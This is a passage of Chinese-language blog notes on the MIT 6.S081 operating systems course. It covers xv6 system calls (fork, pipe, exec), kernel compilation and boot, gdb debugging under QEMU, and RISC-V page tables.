in the xv6 directory</span></span><br><span class="line">$ make qemu</span><br><span class="line"><span class="comment"># ... lots of output ...</span></span><br><span class="line">init: starting sh</span><br><span class="line">$</span><br><span class="line"><span class="comment">#success</span></span><br></pre></td></tr></table></figure><h3 id="fork">fork</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line"> pid = fork();</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;fork return %d\n&quot;</span>,pid);</span><br><span class="line"> <span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;child\n&quot;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;father\n&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ ./a</span><br><span class="line">fork <span class="built_in">return</span> 67703</span><br><span class="line">father</span><br><span class="line">fork <span class="built_in">return</span> 0</span><br><span class="line">child</span><br></pre></td></tr></table></figure><p>fork系统调用在两个进程中都会返回，在原始的进程中，fork系统调用会返回大于0的整数，这个是新创建进程的ID。而在新创建的进程中，fork系统调用会返回0。所以即使两个进程的内存是完全一样的，我们还是可以通过fork的返回值区分旧进程和新进程。</p><p>父子进程拥有不同的内存空间和寄存器，改变一个进程中的变量不会影响另一个进程。</p><h3 id="close">close</h3><p>形式是<code>int close(int fd)</code>，将打开的文件<code>fd</code>释放，使该文件描述符可以被后面的<code>open</code>、<code>pipe</code>等其他system call使用。</p><h3 id="dup">dup</h3><p><code>dup</code>。形式是<code>int dup(int fd)</code>，复制一个新的<code>fd</code>指向的I/O对象，返回这个新fd值，两个I/O对象(文件)的offset相同</p><h3 id="pipe">pipe</h3><p>管道，暴露给进程的一对文件描述符，一个文件描述符用来读，另一个文件描述符用来写，将数据从管道的一端写入，将使其能够被从管道的另一端读出,管道的行为是<strong>FIFO</strong>（先进先出）</p><p><code>pipe</code>是一个system call，形式为<code>int pipe(int p[])</code>，<code>p[0]</code>为读取的文件描述符，<code>p[1]</code>为写入的文件描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSGSIZE 16</span></span><br><span class="line"><span class="keyword">char</span>* msg1 = <span class="string">&quot;hello, world #1&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>* msg2 = <span class="string">&quot;hello, world #2&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>* msg3 = <span class="string">&quot;hello, world #3&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> inbuf[MSGSIZE];</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>], i;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (pipe(p) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* continued */</span></span><br><span class="line">    <span class="comment">/* write pipe */</span></span><br><span class="line">  </span><br><span class="line">    write(p[<span class="number">1</span>], msg1, MSGSIZE);</span><br><span class="line">    write(p[<span class="number">1</span>], msg2, MSGSIZE);</span><br><span class="line">    write(p[<span class="number">1</span>], msg3, MSGSIZE);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="comment">/* read pipe */</span></span><br><span class="line">        read(p[<span class="number">0</span>], inbuf, MSGSIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;% s\n&quot;</span>, inbuf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="execwait系统调用">exec，wait系统调用</h3><p>系统调用 <code>exec</code> 将从某个文件（通常是可执行文件）里读取内存镜像，并将其替换到调用它的进程的内存空间，这样相当于丢弃了调用进程的内存，并开始执行新加载的指令。</p><p>通常来说exec系统调用不会返回，因为exec会完全替换当前进程的内存，相当于当前进程不复存在了，所以exec系统调用已经没有地方能返回了。所以shell的话会先fork，之后在子进程里进行exec</p><figure><img src="/2022/07/07/6.s081/image-20220708142644161.png" alt="image-20220708142644161"><figcaption aria-hidden="true">image-20220708142644161</figcaption></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ forkexec</span><br><span class="line">parent waiting</span><br><span class="line">THIS IS ECHO</span><br><span class="line">child <span class="built_in">exit</span> status 0</span><br></pre></td></tr></table></figure><p>wait会等待之前创建的子进程退出(只能父等子进程)，其中的 status是子进程退出时的状态，正常退出的是0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;echoasasdf&quot;, argv);</span><br><span class="line">printf(&quot;exec failed!\n&quot;);</span><br><span class="line">exit(1111);</span><br><span class="line"></span><br><span class="line">$ forkexec</span><br><span class="line">parent waiting</span><br><span class="line">exec failed!</span><br><span class="line">child exit status 1111</span><br></pre></td></tr></table></figure><h1 id="chapter3">Chapter3</h1><blockquote><p>https://zhayujie.com/mit6828-env.html</p></blockquote><ol type="1"><li>隔离性（isolation）</li><li>防御性 (Defensive)</li><li>协同调度（Cooperative Scheduling）：在发现自己运行了一段时间之后，需要让别的程序也有机会能运行。这种机制有时候称为协同调度。</li><li>kernel mode：特殊权限指令主要是一些直接操纵硬件的指令和设置保护的指令，例如设置page table寄存器、关闭时钟中断。在处理器上有各种各样的状态，操作系统会使用这些状态，但是只能通过特殊权限指令来变更这些状态。</li></ol><p>RISC-V的模式其实是三种：（user/kernel/machine）</p><p>内核有时候也被称为可被信任的计算空间（Trusted Computing Base）</p><p>宏内核 vs 微内核 （Monolithic Kernel vs Micro Kernel）</p><p>宏内核：整个操作系统代码都运行在kernel mode。大多数的Unix操作系统实现都运行在kernel mode。比如，XV6中，所有的操作系统服务都在kernel mode中，这种形式被称为Monolithic Kernel Design。宏内核的优势在于，因为这些子模块现在都位于同一个程序中，它们可以紧密的集成在一起，这样的集成提供很好的性能。例如Linux，它就有很不错的性能。</p><p>微内核：希望在kernel mode中运行尽可能少的代码。所以这种设计下还是有内核，但是内核只有非常少的几个模块。</p><p>需要有一种方式能够让应用程序可以将控制权转移给内核（Entering Kernel）。</p><p>在RISC-V中，有一个专门的指令用来实现这个功能，叫做ECALL。ECALL接收一个数字参数，当一个用户程序想要将程序执行的控制权转移到内核，它只需要执行ECALL指令，并传入一个数字。这里的数字参数代表了应用程序想要调用的System Call。</p><p>可被信任的计算空间（Trusted Computing Base）TCB</p><p>IPC（Inter-Process Communication，进程间通信）</p><p>对于任何文件系统的交互，都需要分别完成2次用户空间&lt;-&gt;内核空间的跳转。与宏内核对比，在宏内核中如果一个应用程序需要与文件系统交互，只需要完成1次用户空间&lt;-&gt;内核空间的跳转，所以微内核的的跳转是宏内核的两倍。</p><h2 id="编译运行kernel">编译运行kernel</h2><p>xv6为宏内核</p><p>kernel：包含所有内核文件，里所有的文件会被编译成一个叫做kernel的二进制文件，然后这个二进制文件会被运行在kernle mode中。</p><p>mkfs：它会创建一个空的文件镜像，我们会将这个镜像存在磁盘上，这样我们就可以直接使用一个空的文件系统。</p><p>编译内核过程：</p><ul><li>首先，Makefile（XV6目录下的文件）会读取一个C文件，例如proc.c；之后调用gcc编译器，生成一个文件叫做proc.s，这是RISC-V 汇编语言文件；之后再走到汇编解释器，生成proc.o，这是汇编语言的二进制格式。</li><li>Makefile会为所有内核文件做相同的操作。</li><li>之后，系统加载器（Loader）会收集所有的.o文件，将它们链接在一起，并生成内核文件。</li></ul><p>这里为了方便还会生成kernel.asm，包含了内核的完整汇编语言:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">kernel/kernel:     file format elf64-littleriscv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000080000000 &lt;_entry&gt;:</span><br><span class="line">    80000000:0000a117          auipcsp,0xa</span><br><span class="line">    80000004:83010113          addisp,sp,-2000 # 80009830 &lt;stack0&gt;</span><br><span class="line">    80000008:6505                luia0,0x1</span><br><span class="line">    8000000a:f14025f3          csrra1,mhartid</span><br><span class="line">    8000000e:0585                addia1,a1,1</span><br><span class="line">    80000010:02b50533          mula0,a0,a1</span><br><span class="line">    80000014:912a                addsp,sp,a0</span><br><span class="line">    80000016:070000ef          jalra,80000086 &lt;start&gt;</span><br><span class="line"></span><br><span class="line">000000008000001a &lt;spin&gt;:</span><br><span class="line">    8000001a:a001                j8000001a &lt;spin&gt;</span><br><span class="line"></span><br><span class="line">000000008000001c &lt;timerinit&gt;:</span><br><span class="line">// which arrive at timervec in kernelvec.S,</span><br><span class="line">// which turns them into software interrupts for</span><br><span class="line">// devintr() in trap.c.</span><br><span class="line">void</span><br><span class="line">timerinit()</span><br><span class="line">&#123;</span><br><span class="line">    8000001c:1141                addisp,sp,-16</span><br><span class="line">    8000001e:e422                sds0,8(sp)</span><br><span class="line">    80000020:0800                addis0,sp,16</span><br><span class="line">// which hart (core) is this?</span><br><span class="line">static inline uint64</span><br><span class="line">r_mhartid()</span><br><span class="line">&#123;</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>可以看到第一个指令在0x80000000.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ sudo make qemu</span><br><span class="line">qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,<span class="keyword">if</span>=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0</span><br><span class="line"></span><br><span class="line">xv6 kernel is booting</span><br><span class="line"></span><br><span class="line">hart 2 starting</span><br><span class="line">hart 1 starting</span><br><span class="line">init: starting sh</span><br><span class="line">$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传给QEMU的几个参数：</p><ul><li>-kernel：这里传递的是内核文件（kernel目录下的kernel文件），这是将在QEMU中运行的程序文件。</li><li>-m：这里传递的是RISC-V虚拟机将会使用的内存数量</li><li>-smp：这里传递的是虚拟机可以使用的CPU核数</li><li>-drive：传递的是虚拟机使用的磁盘驱动，这里传入的是fs.img文件</li></ul><p>当我们说QEMU仿真了RISC-V处理器时，背后的含义：</p><p>直观来看，QEMU是一个大型的开源C程序，你可以下载或者git clone它。但是在内部，在QEMU的主循环中，只在做一件事情：</p><ul><li>读取4字节或者8字节的RISC-V指令。</li><li>解析RISC-V指令，并找出对应的操作码（op code）。我们之前在看kernel.asm的时候，看过一些操作码的二进制版本。通过解析，或许可以知道这是一个ADD指令，或者是一个SUB指令。</li><li>之后，在软件中执行相应的指令。</li></ul><h2 id="xv6启动过程">xv6启动过程</h2><p>启动qemu，打开gdb：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ sudo make CPUS=1 qemu-gdb </span><br><span class="line">*** Now run <span class="string">&#x27;gdb&#x27;</span> <span class="keyword">in</span> another window.</span><br><span class="line">qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 1 -nographic -drive file=fs.img,<span class="keyword">if</span>=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 -S -gdb tcp::25000</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在xv6的目录再打开一个终端：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch kernel/kernel</span><br><span class="line"><span class="comment">#至于还要装什么我也忘了，鼓弄一下午，，，，fk</span></span><br></pre></td></tr></table></figure><p>常用gdb指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">layout split        # 同时打开源码及汇编窗口</span><br><span class="line">layout reg          # 打开寄存器窗口</span><br><span class="line">layout asm          # 打开汇编窗口</span><br><span class="line">next / nexti        # 单步到下一行 源代码 / 指令，不进入函数</span><br><span class="line">step / stepi        # 单步到下一行 源代码 / 指令，进入函数</span><br><span class="line">break (b)           # 设置断点，后面可接函数、行号、地址等</span><br><span class="line">continue (c)        # 继续执行到下一个断点</span><br></pre></td></tr></table></figure><p>进去之后断在_entry</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from kernel/kernel...</span><br><span class="line">The target architecture is assumed to be riscv:rv64</span><br><span class="line">0x0000000000001000 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) b _entry</span><br><span class="line">Breakpoint 1 at 0x8000000a</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000000008000000a <span class="keyword">in</span> _entry ()</span><br><span class="line">=&gt; 0x000000008000000a &lt;_entry+10&gt;:f3 25 40 f1csrra1,mhartid</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>这里可以看到，XV6从entry.s开始启动，这个时候没有内存分页，没有隔离性，并且运行在M-mode（machine mode）。XV6会尽可能快的跳转到kernel mode或者说是supervisor mode。我们在main函数设置一个断点，main函数已经运行在supervisor mode了。接下来我运行程序，代码会在断点，也就是main函数的第一条指令停住。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 2 at 0x80000ec6: file kernel/main.c, line 13.</span><br></pre></td></tr></table></figure><p>进入 layout split 模式：</p><figure><img src="/2022/07/07/6.s081/image-20211127204219036.png" alt="image-20211127204219036"><figcaption aria-hidden="true">image-20211127204219036</figcaption></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    consoleinit();</span><br><span class="line">    printfinit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;xv6 kernel is booting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    kinit();         <span class="comment">// physical page allocator</span></span><br><span class="line">    kvminit();       <span class="comment">// create kernel page table</span></span><br><span class="line">    kvminithart();   <span class="comment">// turn on paging</span></span><br><span class="line">    procinit();      <span class="comment">// process table</span></span><br><span class="line">    trapinit();      <span class="comment">// trap vectors</span></span><br><span class="line">    trapinithart();  <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinit();      <span class="comment">// set up interrupt controller</span></span><br><span class="line">    plicinithart();  <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">    binit();         <span class="comment">// buffer cache</span></span><br><span class="line">    iinit();         <span class="comment">// inode cache</span></span><br><span class="line">    fileinit();      <span class="comment">// file table</span></span><br><span class="line">    virtio_disk_init(); <span class="comment">// emulated hard disk</span></span><br><span class="line">    userinit();      <span class="comment">// first user process</span></span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    started = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(started == <span class="number">0</span>)</span><br><span class="line">      ;</span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hart %d starting\n&quot;</span>, cpuid());</span><br><span class="line">    kvminithart();    <span class="comment">// turn on paging</span></span><br><span class="line">    trapinithart();   <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinithart();   <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  scheduler();        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有很多初始化的函数，顺序也很重要：</p><ul><li>kinit：设置好页表分配器（page allocator）</li><li>kvminit：设置好虚拟内存，这是下节课的内容</li><li>kvminithart：打开页表，也是下节课的内容</li><li>processinit：设置好初始进程或者说设置好进程表单</li><li>trapinit/trapinithart：设置好user/kernel mode转换代码</li><li>plicinit/plicinithart：设置好中断控制器PLIC（Platform Level Interrupt Controller），我们后面在介绍中断的时候会详细的介绍这部分，这是我们用来与磁盘和console交互方式</li><li>binit：分配buffer cache</li><li>iinit：初始化inode缓存</li><li>fileinit：初始化文件系统</li><li>virtio_disk_init：初始化磁盘</li><li>userinit：最后当所有的设置都完成了，操作系统也运行起来了，会通过userinit运行第一个进程，这里有点意思，接下来我们看一下userinit</li></ul><p>跟userinit：</p><figure><img src="/2022/07/07/6.s081/image-20211127204927777.png" alt="image-20211127204927777"><figcaption aria-hidden="true">image-20211127204927777</figcaption></figure><p>实际上initcode就是执行了exec("/init")</p><p>断在syscall：</p><figure><img src="/2022/07/07/6.s081/image-20211127205221097.png" alt="image-20211127205221097"><figcaption aria-hidden="true">image-20211127205221097</figcaption></figure><p><code>num = p-&gt;trapframe-&gt;a7;</code>读取使用的系统调用的整数，执行完：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p num</span><br><span class="line"><span class="variable">$1</span> = 7</span><br></pre></td></tr></table></figure><figure><img src="/2022/07/07/6.s081/image-20211127205509797.png" alt="image-20211127205509797"><figcaption aria-hidden="true">image-20211127205509797</figcaption></figure><p>是exc系统调用。</p><p>之后的<code>p-&gt;trapframe-&gt;a0 = syscalls[num]();</code>执行系统调用，跟到syscalls中去：</p><figure><img src="/2022/07/07/6.s081/image-20211127205923786.png" alt="image-20211127205923786"><figcaption aria-hidden="true">image-20211127205923786</figcaption></figure><p>sys_exec会从用户空间读取参数，它会读取path，也就是要执行程序的文件名。这里首先会为参数分配空间，然后从用户空间将参数拷贝到内核空间。</p><p>传入的是init程序，看下</p><figure><img src="/2022/07/07/6.s081/image-20211127210234975.png" alt="image-20211127210234975"><figcaption aria-hidden="true">image-20211127210234975</figcaption></figure><p>init会为用户空间设置好一些东西，比如配置好console，调用fork，并在fork出的子进程中执行shell。</p><p>然后就可以在qemu中看到shell起来了</p><h1 id="chapter4">Chapter4</h1><p>页表，内存管理单元（Memory Management Unit）</p><figure><img src="/2022/07/07/6.s081/image-20211128000721204.png" alt="image-20211128000721204"><figcaption aria-hidden="true">image-20211128000721204</figcaption></figure><p>page table保存在内存中，MMU只是会去查看page table，我们接下来会看到，page table比我们这里画的要稍微复杂一些。</p><p>当操作系统将CPU从一个应用程序切换到另一个应用程序时，同时也需要切换SATP寄存器中的内容，从而指向新的进程保存在物理内存中的地址对应表单。</p><p>RISC-V中，一个page是4KB。</p><p>首先对于虚拟内存地址，我们将它划分为两个部分，index和offset，index用来查找page，offset对应的是一个page中的哪个字节。</p><p>当MMU在做地址翻译的时候，通过读取虚拟内存地址中的index可以知道物理内存中的page号，将offset加上page的起始地址，就可以得到物理内存地址。</p><p>实际上，在我们使用的RSIC-V处理器上，并不是所有的64bit都被使用了，也就是说高25bit并没有被使用。这样的结果是限制了虚拟内存地址的数量，虚拟内存地址的数量现在只有2^39个，大概是512GB。</p><p>在剩下的39bit中，有27bit被用来当做index，12bit被用来当做offset。offset必须是12bit，因为对应了一个page的4096个字节。</p><p>在RISC-V中，物理内存地址是56bit。其中44bit是物理page号（PPN，Physical Page Number），剩下12bit是offset完全继承自虚拟内存地址（也就是地址转换时，只需要将虚拟内存中的27bit翻译成物理内存中的44bit的page号，剩下的12bitoffset直接拷贝过来即可）。</p><p>实际上page table是一个多级的结构，下图是一个真正的RISC-V page table结构和硬件实现。3级结构是由硬件实现而不是系统。</p><figure><img src="/2022/07/07/6.s081/image-20211128001754166.png" alt="image-20211128001754166"><figcaption aria-hidden="true">image-20211128001754166</figcaption></figure><p>27bit的index，实际上是由3个9bit的数字组成（L2，L1，L0）。前9个bit被用来索引最高级的page directory。Directory中的一个条目被称为PTE（Page Table Entry）是64bits，就像寄存器的大小一样，也就是8Bytes。所以一个Directory page有512个条目。</p><p>实际上，SATP寄存器会指向最高一级的page directory的物理内存地址，之后我们用虚拟内存中index的高9bit用来索引最高一级的page directory，这样我们就能得到一个PPN，也就是物理page号。这个PPN指向了中间级的page directory。</p><p>当我们在使用中间级的page directory时，我们通过虚拟内存地址中的L1部分完成索引。接下来会走到最低级的page directory，我们通过虚拟内存地址中的L0部分完成索引。在最低级的page directory中，我们可以得到对应于虚拟内存地址的物理内存地址。</p><p>之前的方案要用到2^27个PTE，现在这个方案中，只需要3 * 512个PTE，大大减少</p><p>接下来看看PTE中的Flag。每个PTE的低10bit是一堆标志位：</p><ul><li>第一个标志位是Valid。如果Valid bit位为1，那么表明这是一条合法的PTE，你可以用它来做地址翻译。对于刚刚举得那个小例子（应用程序只用了1个page的例子），我们只使用了3个page directory，每个page directory中只有第0个PTE被使用了，所以只有第0个PTE的Valid bit位会被设置成1，其他的511个PTE的Valid bit为0。这个标志位告诉MMU，你不能使用这条PTE，因为这条PTE并不包含有用的信息。</li><li>下两个标志位分别是Readable和Writable。表明你是否可以读/写这个page。</li><li>Executable表明你可以从这个page执行指令。</li><li>User表明这个page可以被运行在用户空间的进程访问。</li><li>其他标志位并不是那么重要。</li></ul><p>这里还会用到页表缓存（Translation Lookaside Buffer）：对于一个虚拟内存地址的寻址，需要读三次内存，这里代价有点高。所以实际中，几乎所有的处理器都会对于最近使用过的虚拟地址的翻译结果有缓存。</p><p>接下来看XV6中，page table是如何工作的。</p><p>下图就是内核中地址的对应关系，左边是内核的虚拟地址空间，右边上半部分是物理内存或者说是DRAM，右边下半部分是I/O设备。</p><figure><img src="/2022/07/07/6.s081/image-20211128230803818.png" alt="image-20211128230803818"><figcaption aria-hidden="true">image-20211128230803818</figcaption></figure><p>或者说是这样：</p><figure><img src="/2022/07/07/6.s081/image-20211128230837614.png" alt="image-20211128230837614"><figcaption aria-hidden="true">image-20211128230837614</figcaption></figure><p>上面那个图的右侧，地址0x1000是boot ROM的物理地址，当你对主板上电，主板做的第一件事情就是运行存储在boot ROM中的代码，当boot完成之后，会跳转到地址0x80000000。</p><p>其他的一些IO设备：</p><ul><li>PLIC是中断控制器（Platform-Level Interrupt Controller）。</li><li>CLINT（Core Local Interruptor）也是中断的一部分。所以多个设备都能产生中断，需要中断控制器来将这些中断路由到合适的处理函数。</li><li>UART0（Universal Asynchronous Receiver/Transmitter）负责与Console和显示器交互。</li><li>VIRTIO disk，与磁盘进行交互。</li></ul><p>低于0x80000000的物理地址，不存在于DRAM中，当我们在使用这些地址的时候，指令会直接走向其他的硬件。</p><p>有一些page在虚拟内存中的地址很靠后，比如kernel stack在虚拟内存中的地址就很靠后。这是因为在它之下有一个未被映射的Guard page，这个Guard page对应的PTE的Valid 标志位没有设置，这样，如果kernel stack耗尽了，它会溢出到Guard page，但是因为Guard page的PTE中Valid标志位未设置，会导致立即触发page fault，这样的结果好过内存越界之后造成的数据混乱。立即触发一个panic（也就是page fault），你就知道kernel stack出错了。同时我们也又不想浪费物理内存给Guard page，所以Guard page不会映射到任何物理内存，它只是占据了虚拟地址空间的一段靠后的地址。</p><p>同时，kernel stack被映射了两次，在靠后的虚拟地址映射了一次，在PHYSTOP下的Kernel data中又映射了一次，但是实际使用的时候用的是上面的部分，因为有Guard page会更加安全。</p><p>该跟着调4.6了</p><p>这里应该先跳过了，先干后面的。</p><h2 id="kvminit函数">kvminit函数</h2><figure><img src="/2022/07/07/6.s081/image-20220709140553688.png" alt="image-20220709140553688"><figcaption aria-hidden="true">image-20220709140553688</figcaption></figure><p>首先分配物理page，就是kalloc那里，之后初始化内存为0，之后将每个I/O设备映射到内核，</p><p>在memlayout.h中，可以看到映射地址：<img src="/2022/07/07/6.s081/image-20220709140815091.png" alt="image-20220709140815091"></p><p>通过kvmmap可以将物理地址映射到相同的虚拟地址（注，因为kvmmap的前两个参数一致）</p><h1 id="chapter5">Chapter5</h1><blockquote><p>导读：https://pdos.csail.mit.edu/6.828/2020/readings/riscv-calling.pdf</p></blockquote><p>这里用到的asm不是x86而是RISC-V，精简指令集（诞生于uc berkeley），而x86是复杂是复杂指令集CISC。</p><p>RISC指令集开源相关文档在课程页可找到，包含特殊权限指令和普通指令。相比x86的文档小了很多。</p><blockquote><p>5.3的一些图片被删了，commit里面可以找到：https://github.com/huihongxiao/MIT6.S081/commit/6e5a0d8c2a3840bc9d3a8a381ff491567f1f9ee9。</p></blockquote><p>用到的RISC指令：</p><p><img src="/2022/07/07/6.s081/image-20211129172038380.png"></p><p>然后是stack相关的内容，和之前pwn的内容重合，就不写了，但是里面一些gdb的指令还是可以看看的。</p><p>在gdb中输入layout asm，可以在tui窗口看到所有的汇编指令。再输入layout reg可以看到所有的寄存器信息。</p><h1 